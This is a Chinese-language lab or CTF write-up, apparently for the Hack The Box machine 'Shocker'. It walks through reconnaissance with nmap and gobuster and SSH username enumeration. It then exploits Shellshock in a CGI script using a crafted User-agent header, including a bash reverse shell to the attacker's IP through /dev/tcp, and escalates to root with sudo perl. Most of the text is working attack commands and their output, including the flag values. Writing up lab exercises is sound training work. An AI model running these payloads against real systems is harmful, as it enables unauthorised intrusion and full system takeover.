靶机：10.10.10.56

kali： 10.10.16.3

```
└─# nmap -n -v -sV -sC 10.10.10.56
```

```bash
└─# nmap -p$ports -sV -sC -O $IP -oA nmap.txt
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



```bash
└─# strings bug.jpg 
CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```



修改脚本报错[AttributeError: module 'time' has no attribute 'clock' in Python 3.8 - Stack Overflow](https://stackoverflow.com/questions/58569361/attributeerror-module-time-has-no-attribute-clock-in-python-3-8)

[AttributeError: 模块'time'没有属性'clock'的解决方法 - 掘金 (juejin.cn)](https://juejin.cn/post/7116506231044309022)

openssh 用户名枚举

```
└─# python 40136.py 10.10.10.56:2222 -e -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```



```bash
└─# ssh shocker@10.10.10.56 -p 2222
```



```bash
└─# gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash
```

--add-slash 为结尾加上后缀 / ，如 http://10.10.10.56/cgi-bin/



```bash
└─# gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,sh
```

得到

```
http://10.10.10.56/cgi-bin/user.sh
```



```bash
┌──(root💀kali)-[~/shocker]
└─# curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 21:26:49 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00


                                                                                                                                                                  
┌──(root💀kali)-[~/shocker]
└─# curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 21:26:56 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00
```



Shellshock漏洞

[Exploiting CGI Scripts with Shellshock (antonyt.com)](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)

```bash
curl http://10.10.10.56/cgi-bin/user.sh -H  "User-agent: () { :;}; ping 10.10.16.3 -t3" 
```

<img src=".\图片\Snipaste_2023-09-01_09-36-10.png" alt="Snipaste_2023-09-01_09-36-10" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-09-01_09-36-28.png" alt="Snipaste_2023-09-01_09-36-28" style="zoom:80%;" />



```bash
curl http://10.10.10.56/cgi-bin/user.sh  -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.3/443 0>&1" 
```



```bash
└─# nc -lvnp 443                  
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.56] 51296
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```



```bash
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
731559d97403d5daa92e734c38255ab0
```



此时如果为了得到更好的 shell ，可以上传 公钥到 shelly 家里的 .ssh 目录，在私钥登录



```bash
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
748c855566791f0ad34a0eddbf47172d
```



补充下

```bash
su shelly
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

lxd 也可以提权





问题所在，目录没扫出来，gobuster 好像抽风了

目录扫的是 http://10.10.10.56/cgi-bin  显示 404

应该是 http://10.10.10.56/cgi-bin/ 显示 403


